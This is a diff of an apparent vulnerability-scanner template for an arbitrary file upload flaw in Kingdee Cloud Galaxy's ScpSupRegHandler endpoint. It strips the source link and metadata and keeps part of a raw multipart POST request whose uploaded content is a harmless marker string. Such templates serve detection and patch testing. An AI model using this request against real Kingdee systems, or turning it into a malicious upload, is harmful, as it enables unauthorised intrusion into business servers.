@@ -3,12 +3,8 @@ info:
   name: 金蝶云星空ScpSupRegHandler任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lka2lddk2ys94f3t'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lka2lddk2ys94f3t
-    fofa: 暂无
 http:
 - raw:
   - 'POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
@@ -26,14 +22,10 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     --zsqxokga
 
 
     Content-Disposition: form-data; name="dbId_v"
-
-
 
 
     .
@@ -43,8 +35,6 @@ http:
 
 
     Content-Disposition: form-data; name="FID"
-
-
 
 
     2022
@@ -57,8 +47,6 @@ http:
 
 
     Content-Type: text/plain
-
-
 
 
     dudesuite
